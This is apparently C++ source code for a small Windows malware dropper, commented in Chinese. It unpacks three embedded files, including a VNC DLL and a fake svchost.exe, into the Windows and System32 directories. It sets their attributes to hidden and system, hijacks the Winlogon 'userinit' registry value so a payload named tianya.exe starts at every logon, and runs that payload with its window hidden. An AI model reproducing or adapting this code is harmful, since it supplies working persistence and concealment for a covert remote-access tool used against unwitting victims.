// 3.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include<windows.h>
#pragma comment(lib,"user32.lib") 
#pragma comment(lib,"kernel32.lib") 

#pragma comment(linker, "/OPT:NOWIN98")   //取消这4行的注释，可编译出2K大的文件 
#pragma comment(linker, "/merge:.data=.text")    
#pragma comment(linker, "/merge:.rdata=.text")    
#pragma comment(linker, "/align:0x200") 
#pragma comment(linker, "/ENTRY:run")    
#pragma comment(linker, "/subsystem:windows") 
//#include<resource.h>
#define IDR_RC1                         101
#define IDR_RC2                         102
#define IDR_RC3                         103

BOOL  CreatServer(char outfile[],char ID);
BOOL  CreatServer3(char outfile[],char ID);

//BOOL run();
//BOOL CreatServer(char outfile[],char resID[], char resknid[])
BOOL CreatServer(char outfile[],char ID)
{
    HRSRC  hResInfo;
    HGLOBAL hResdata;
    DWORD dwSize,dwWritten;
    //文件句柄
    HANDLE hFile;
    
    char WindowsPath[MAX_PATH]={0};
    GetWindowsDirectory(WindowsPath,MAX_PATH);
    int len = strlen(WindowsPath)-1; 
    if(WindowsPath[len]!='\\')
		strcat(WindowsPath,"\\");
    strcat(WindowsPath,outfile);
	//MessageBox(NULL, "OK1",WindowsPath, MB_OK);
    hResInfo = FindResource(NULL, MAKEINTRESOURCE(ID),
		"RC");
	//MessageBox(NULL, resID,resknid, MB_OK);
	if( hResInfo == NULL)
    {
		//MessageBox(NULL, "错误", "OK", MB_OK);
		
	}
	
    dwSize = SizeofResource(NULL, hResInfo);
    hResdata = LoadResource(NULL, hResInfo);
    if(hResdata ==NULL)
		return FALSE;
	
    hFile = CreateFile(WindowsPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
		0, NULL);
    if(hFile ==NULL)
		return FALSE;
	WriteFile(hFile, (LPCVOID)LockResource(hResdata), dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
	
}

BOOL CreatServer3(char outfile[],char ID)
{
    HRSRC  hResInfo;
    HGLOBAL hResdata;
    DWORD dwSize,dwWritten;
    //文件句柄
    HANDLE hFile;
    
    char WindowsPath[MAX_PATH]={0};
    GetSystemDirectory(WindowsPath,MAX_PATH);
    int len = strlen(WindowsPath)-1; 
    if(WindowsPath[len]!='\\')
		strcat(WindowsPath,"\\");
    strcat(WindowsPath,outfile);
	//MessageBox(NULL, "OK1",WindowsPath, MB_OK);
    hResInfo = FindResource(NULL, MAKEINTRESOURCE(ID),
		"RC");
	//MessageBox(NULL, resID,resknid, MB_OK);
	if( hResInfo == NULL)
    {
		//MessageBox(NULL, "错误", "OK", MB_OK);
		
	}
	
    dwSize = SizeofResource(NULL, hResInfo);
    hResdata = LoadResource(NULL, hResInfo);
    if(hResdata ==NULL)
		return FALSE;
	
    hFile = CreateFile(WindowsPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
		0, NULL);
    if(hFile ==NULL)
		return FALSE;
	WriteFile(hFile, (LPCVOID)LockResource(hResdata), dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
	
}

void run()
{
	char file1[10]="vnc.dll";
	char file2[20]="svchost.exe";
    char file3[12]="tianya.exe";
	
	CreatServer(file1,IDR_RC1);
	CreatServer(file2,IDR_RC2);
	CreatServer3(file3,IDR_RC3);
	
    char regname[MAX_PATH]="userinit.exe,tianya.exe";
    HKEY key;
	if( RegOpenKeyEx( HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
		0, KEY_ALL_ACCESS, &key ) == ERROR_SUCCESS)
	{
		RegSetValueEx(key,"userinit",0,REG_SZ,(BYTE *)regname,lstrlen(regname)); 
		RegCloseKey(key); 
	}
	
    
	
	
	char TempPath3[MAX_PATH];
    GetSystemDirectory(TempPath3 ,MAX_PATH);
	strcat(TempPath3,"\\");
	strcat(TempPath3,file3);
	SetFileAttributes(TempPath3,FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_HIDDEN);
	
	char TempPath2[MAX_PATH];
    GetWindowsDirectory(TempPath2 ,MAX_PATH);
	strcat(TempPath2,"\\");
	strcat(TempPath2,file2);
	SetFileAttributes(TempPath2,FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_HIDDEN);
	
	char TempPath1[MAX_PATH];
    GetWindowsDirectory(TempPath1 ,MAX_PATH);
	strcat(TempPath1,"\\");
	strcat(TempPath1,file1);
	SetFileAttributes(TempPath1,FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_HIDDEN);
	//MessageBox(0,TempPath3,"安装错误!", MB_OK);
	
	
	STARTUPINFO si; //进程启动时需要初始化的结构
	PROCESS_INFORMATION pi; //进程启动后的有关信息
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si); 
	si.wShowWindow = SW_HIDE;//这里设置窗口为显示，SW_HIDE为隐藏窗口
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	//CreateProcess(NULL,
	//cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi);
	
	if(!CreateProcess(NULL,TempPath3,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi))
	{
		//MessageBox(0,"安装错误!","错误", MB_OK);
		//printf("运行出错!\r\n");
	}
}